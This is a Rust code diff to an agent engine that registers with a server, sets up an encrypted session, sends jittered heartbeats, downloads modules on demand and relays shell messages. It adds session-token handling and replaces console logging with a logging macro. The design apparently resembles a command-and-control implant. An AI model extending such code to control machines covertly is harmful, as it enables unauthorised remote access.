@@ -22,6 +22,8 @@ pub struct AgentEngine {
     ws: Option<WsCommunicator>,
     ws_tx: Option<WsSender>,
     agent_id: String,
+    /// Per-session channel token issued at registration (rotates per session).
+    session_token: String,
     /// Profile paths adopted at registration (empty = use build-time paths).
     heartbeat_path: String,
     result_path: String,
@@ -50,6 +52,7 @@ impl AgentEngine {
             ws: None,
             ws_tx: None,
             agent_id: String::new(),
+            session_token: String::new(),
             heartbeat_path: String::new(),
             result_path: String::new(),
         }
@@ -91,21 +94,27 @@ impl AgentEngine {
 
         let agent_id = outcome.agent_id;
         let session_key = outcome.session_key;
+        self.session_token = outcome.session_token.clone().unwrap_or_default();
         self.heartbeat_path = outcome.heartbeat_path;
         self.result_path = outcome.result_path;
+
+        // Adopt the per-session channel token for all subsequent requests.
+        if let Some(t) = outcome.session_token {
+            http.set_session_token(t);
+        }
 
         // Establish AES-256-GCM session key from the RSA-encrypted blob.
         if let Some(key) = session_key {
             if let Err(e) = self.crypto.set_session_key(&key) {
-                eprintln!("[WARN] Failed to set session key: {}", e);
+                libra_common::dlog!("[WARN] Failed to set session key: {}", e);
             } else {
-                eprintln!("[INFO] AES-256-GCM session key established");
+                libra_common::dlog!("[INFO] AES-256-GCM session key established");
             }
         } else {
-            eprintln!("[WARN] Server did not return a session key (encryption disabled)");
+            libra_common::dlog!("[WARN] Server did not return a session key (encryption disabled)");
         }
 
-        eprintln!("[INFO] registered | agent_id={} | hostname={}", agent_id, hostname);
+        libra_common::dlog!("[INFO] registered | agent_id={} | hostname={}", agent_id, hostname);
         self.agent_id = agent_id;
         self.http = Some(http);
 
@@ -153,13 +162,14 @@ impl AgentEngine {
         let hb_key = self.crypto.session_key();
         let hb_interval_ms = self.config.heartbeat_interval_ms;
         let hb_jitter = self.config.jitter_percent;
+        let session_token = self.session_token.clone();
 
         // Cloud module manager — downloads modules on demand (shared with the
         // heartbeat task that executes one-shot tasks).
         let module_manager = std::sync::Arc::new(tokio::sync::Mutex::new(
             crate::module_manager::ModuleManager::new(
                 &server_url, &register_path, &heartbeat_path, &result_path,
-                agent_id.clone(), hb_key,
+                agent_id.clone(), hb_key, Some(session_token.clone()),
             ),
         ));
 
@@ -180,11 +190,14 @@ impl AgentEngine {
         let hb_reconnect = reconnect_tx.clone();
         let hb_gate = shared.clone();
         tokio::spawn(async move {
-            let hb_http = HttpCommunicator::new(&server_url, &register_path, &heartbeat_path, &result_path);
+            let mut hb_http = HttpCommunicator::new(&server_url, &register_path, &heartbeat_path, &result_path);
+            if !session_token.is_empty() {
+                hb_http.set_session_token(session_token);
+            }
             loop {
                 match heartbeat_tick(&hb_http, &agent_id, hb_key.as_ref(), &hb_mm).await {
                     Err(e) if e == "SESSION_LOST" => {
-                        eprintln!("[WARN] session lost — triggering re-registration");
+                        libra_common::dlog!("[WARN] session lost — triggering re-registration");
                         let _ = hb_reconnect.send(());
                         break;
                     }
@@ -212,12 +225,12 @@ impl AgentEngine {
                 Ok(_gate) => {
                     tokio::select! {
                         _ = reconnect_rx.recv() => {
-                            eprintln!("[INFO] re-registering with server");
+                            libra_common::dlog!("[INFO] re-registering with server");
                             do_reconnect = true;
                         }
 
                         Some(msg) = shell_rx.recv() => {
-                            eprintln!("[SEND] {} | rid={} | data={}",
+                            libra_common::dlog!("[SEND] {} | rid={} | data={}",
                                 msg.msg_type,
                                 msg.request_id.as_deref().unwrap_or("-"),
                                 msg.data.as_ref().map(|v| v.to_string()).unwrap_or_else(|| "null".into())
@@ -229,7 +242,7 @@ impl AgentEngine {
                             match result {
                                 Ok(Some(msg)) => {
                                     reconnect_delay_ms = 1000;
-                                    eprintln!("[RECV] {} | rid={} | data={}",
+                                    libra_common::dlog!("[RECV] {} | rid={} | data={}",
                                         msg.msg_type,
                                         msg.request_id.as_deref().unwrap_or("-"),
                                         msg.data.as_ref().map(|v| v.to_string()).unwrap_or_else(|| "null".into())
@@ -251,7 +264,7 @@ impl AgentEngine {
                                     });
                                 }
                                 Ok(None) => {
-                                    eprintln!("[WARN] WebSocket disconnected, reconnecting in {}ms...", reconnect_delay_ms);
+                                    libra_common::dlog!("[WARN] WebSocket disconnected, reconnecting in {}ms...", reconnect_delay_ms);
                                     tokio::time::sleep(std::time::Duration::from_millis(reconnect_delay_ms)).await;
                                     if ws.connect().await.is_ok() {
                                         reconnect_delay_ms = 1000;
